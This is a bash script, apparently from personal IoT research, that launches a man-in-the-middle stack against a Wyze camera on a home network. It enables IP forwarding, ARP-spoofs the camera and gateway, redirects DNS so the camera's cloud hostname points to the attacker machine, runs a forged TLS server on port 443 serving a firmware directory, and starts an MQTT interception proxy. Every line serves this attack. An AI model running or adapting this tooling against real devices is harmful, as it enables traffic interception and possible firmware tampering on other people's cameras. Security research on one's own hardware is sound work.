#!/bin/bash
# Bring the local MITM stack up for ONE camera (default .4.24) and prove each listener.
# macOS has no setsid; nohup keeps the children alive after this shell exits.
set -u
PY=/opt/homebrew/bin/python3
HERE="$(cd "$(dirname "$0")" && pwd)"
CAM="${1:-192.168.4.24}"; CAMMAC="${2:-80:48:2c:4b:cf:0b}"; GW="${3:-192.168.4.1}"; GWMAC="${4:-48:dd:0c:c9:ec:0d}"
UP="${5:-192.168.4.160}"

sudo sysctl -w net.inet.ip.forwarding=1 >/dev/null
sudo nohup "$PY" "$HERE/wyze_dns_redirect.py" "$UP" "$GW" > /tmp/dns.log 2>&1 &
sudo nohup /tmp/sp/bin/python "$HERE/wyze_arp_spoof.py" "$CAM" "$CAMMAC" "$GW" "$GWMAC" > /dev/null 2>&1 &
sudo nohup "$PY" "$HERE/wyze_forge_serve.py" --dir /tmp/fwserve --port 443 > /tmp/tls.log 2>&1 &
sudo nohup "$PY" "$HERE/wyze_mqtt_mitm.py" > /tmp/mqproxy.log 2>&1 &
sleep 3
for probe in "udp 53" "tcp 443" "tcp 8883"; do
  set -- $probe
  n=$(sudo lsof -nP -i"$1:$2" | wc -l | tr -d ' ')
  printf '%-10s %s\n' "$1:$2" "$([ "$n" -ge 2 ] && echo up || echo DOWN)"
done
[ "$(ps -ef | grep -c "[w]yze_arp_spoof")" -ge 1 ] && echo "spoof      up" || echo "spoof      DOWN"
dig @"$UP" aws-iot.wyzecam.com +short +time=2 +tries=1
